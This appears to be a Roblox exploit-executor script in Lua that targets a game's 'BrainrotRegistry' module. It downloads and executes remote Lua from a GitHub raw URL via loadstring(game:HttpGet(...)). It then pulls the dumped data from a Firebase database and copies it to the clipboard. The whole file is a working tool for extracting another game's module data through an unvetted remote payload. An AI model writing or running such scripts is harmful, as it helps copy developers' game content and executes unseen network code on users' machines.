getgenv().targetModule = game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Registries"):WaitForChild("BrainrotRegistry")
-- Change the above path to the modulescript data you want to pull and copy
loadstring(game:HttpGet("https://raw.githubusercontent.com/gotham10/pvball/refs/heads/main/test.lua"))()
wait(10)
local HttpService = game:GetService("HttpService")
local function fetch_and_clipboard_data()
    local url = "https://moduledata-78071-default-rtdb.firebaseio.com/.json"
    local http_ok, response = pcall(request, {Url = url, Method = "GET"})
    if not http_ok then
        return
    end
    if not response or not response.Body then
         return
    end
    local response_body = response.Body
    local decode_ok, data = pcall(HttpService.JSONDecode, HttpService, response_body)
    if not decode_ok or data == nil then
        return
    end
    if type(data) == "string" then
        setclipboard(data)
    else
        local encode_ok, json_string = pcall(HttpService.JSONEncode, HttpService, data)
        if encode_ok then
            setclipboard(json_string)
        else
        end
    end
end
fetch_and_clipboard_data()
